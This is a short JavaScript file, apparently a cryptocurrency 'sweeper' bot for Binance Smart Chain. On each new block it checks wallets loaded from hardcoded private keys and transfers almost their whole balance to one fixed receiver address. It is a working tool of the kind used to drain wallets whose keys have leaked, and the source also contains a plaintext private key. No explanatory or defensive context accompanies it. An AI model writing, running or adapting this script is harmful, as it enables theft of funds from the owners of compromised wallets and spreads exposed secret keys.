const { ethers } = require("ethers");

const provider = new ethers.providers.JsonRpcProvider(
  "https://bsc-dataseed.binance.org/"
);

const addressReceiver = "0xaaf0aAb0A3a21D5Da4Cd0cd07a70AD569B92C937";// address here 0xaaf0aAb0A3a21D5Da4Cd0cd07a70AD569B92C937

const privateKeys = ["1bf9f52bc6717f790c92451ae17602d1caebe35a63535281d1456ee0f5840f0b"];

const bot = (async) => {
  provider.on("block", async () => {
    try {
      console.log("Listening to new block, waiting ;)");

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i]);
        const target = _target.connect(provider);
        const balance = await provider.getBalance(target.address);

        const gasPrice = await provider.getGasPrice();
        const gasLimit = await target.estimateGas({
          to: addressReceiver,
          value: balance,
        });
        const gas1 = gasLimit.mul(5);
        const gas2 = gas1.div(3);
        const totalGasCost = gas2.mul(gasPrice);

        if (balance.sub(totalGasCost) > 0) {
          console.log("New Account with Eth!");
          const amount = balance.sub(totalGasCost);

          try {
            await target.sendTransaction({
              to: addressReceiver,
              value: amount,
            });
            console.log(
              `Success! transferred -->${ethers.utils.formatEther(amount)}`
            );
          } catch (e) {
            console.log(`error: ${e}`);
          }
        }
      }
    }
    catch (err) {
      console.log(err);
    }
  });
};

bot();